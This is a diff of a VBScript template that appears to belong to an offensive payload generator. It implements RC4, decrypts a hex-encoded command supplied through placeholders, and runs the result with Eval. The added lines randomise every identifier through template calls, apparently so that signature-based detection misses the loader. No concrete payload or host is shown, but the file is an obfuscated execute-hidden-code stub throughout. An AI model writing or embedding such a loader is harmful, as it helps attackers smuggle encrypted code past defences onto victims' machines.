@@ -1,11 +1,11 @@
-Function RC4(byVal bytes, byVal key)
+Function {{symbol_name("RC4")}}(byVal {{symbol_name("bytes")}}, byVal {{symbol_name("key")}})
     dim s(256), k(256)
     dim  i, j, t, p
     j = 0
     For i = 0 to 255
         s(i) = i
-        j = j Mod (UBound(key) + 1)
-        k(i) = key(j)
+        j = j Mod (UBound({{symbol_name("key")}}) + 1)
+        k(i) = {{symbol_name("key")}}(j)
         j = j + 1
     Next
     j = 0
@@ -17,19 +17,34 @@ Function RC4(byVal bytes, byVal key)
     Next
     i = 0
     j = 0
-    For p = 0 to UBound(bytes)
+    For p = 0 to UBound({{symbol_name("bytes")}})
         i = (i + 1) Mod 256
         j = (j + s(i)) Mod 256
         t = s(j)
         s(j) = s(i)
         s(i) = t
         t = (s(i) + (s(j) Mod 256)) Mod 256
-        bytes(p) = bytes(p) Xor s(t)
+        {{symbol_name("bytes")}}(p) = {{symbol_name("bytes")}}(p) Xor s(t)
     Next
-    RC4 = bytes
+    {{symbol_name("RC4")}} = {{symbol_name("bytes")}}
 end Function
 
-dim code = "{{CMD}}"
-dim key = "{{KEY}}"
-code = RC4(code, key)
-eval(code)
+{{symbol_name("hexstr")}} = "{{HEX_CODE}}"
+{{symbol_name("keystr")}} = "{{HEX_KEY}}"
+{{symbol_name("hexarr")}} = Split({{symbol_name("hexstr")}})
+{{symbol_name("keyarr")}} = Split({{symbol_name("keystr")}})
+For i = 0 To UBound({{symbol_name("hexarr")}})
+  {{symbol_name("hexarr")}}(i) = CInt("&h" & {{symbol_name("hexarr")}}(i))
+Next
+For i = 0 To UBound({{symbol_name("keyarr")}})
+  {{symbol_name("keyarr")}}(i) = CInt("&h" & {{symbol_name("keyarr")}}(i))
+Next
+
+dim {{symbol_name("result")}}
+{{symbol_name("result")}} = {{symbol_name("RC4")}}({{symbol_name("hexarr")}}, {{symbol_name("keyarr")}})
+For i = 0 To UBound({{symbol_name("hexarr")}})
+  {{symbol_name("hexarr")}}(i) = Chr({{symbol_name("result")}}(i))
+Next
+
+{{symbol_name("Code")}} = Join({{symbol_name("hexarr")}}, "")
+Eval({{symbol_name("Code")}})
